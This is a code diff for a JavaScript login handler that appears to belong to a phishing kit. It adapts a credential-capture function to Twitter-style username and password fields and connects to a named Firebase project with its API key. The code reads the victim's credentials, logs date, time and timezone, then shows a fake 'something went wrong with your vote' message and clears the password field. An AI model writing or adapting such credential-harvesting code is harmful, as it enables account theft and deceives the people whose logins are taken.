@@ -1,27 +1,25 @@
 // Initialize Firebase
 const firebaseConfig = {
-  apiKey: "AIzaSyCw-c5ssNHmzEsIJ_xEu9i_Z-misRPkoLM",
-  authDomain: "foodnitr.firebaseapp.com",
-  databaseURL: "https://foodnitr-default-rtdb.firebaseio.com",
-  projectId: "foodnitr",
-  storageBucket: "foodnitr.firebasestorage.app",
-  messagingSenderId: "197828384790",
-  appId: "1:197828384790:web:8531d194ca4a244200bd37"
+  apiKey: "AIzaSyCw-c5ssNHmzEsIJ_xEu9i_Z-misRPkoLM",
+  authDomain: "foodnitr.firebaseapp.com",
+  databaseURL: "https://foodnitr-default-rtdb.firebaseio.com",
+  projectId: "foodnitr",
+  storageBucket: "foodnitr.firebasestorage.app",
+  messagingSenderId: "197828384790",
+  appId: "1:197828384790:web:8531d194ca4a244200bd37",
 };
 firebase.initializeApp(firebaseConfig);
 
-function hmlog() {
+function twilog() {
   firebase
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      var errorCode = error.code;
-      var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
+      showAlert("Error", error.message);
     });
 
-  var email = document.getElementById("hm-email").value;
-  var password = document.getElementById("hm-pass").value;
+  var email = document.getElementById("twi-uname").value;
+  var password = document.getElementById("twi-pass").value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -40,8 +38,7 @@ function hmlog() {
 
     setTimeout(function () {
       alert("Oops! Something went wrong with your vote. Try again.");
-      document.getElementById("fb-pass").value = "";
-
+      document.getElementById("twi-pass").value = "";
       return false;
     }, 2000);
   }
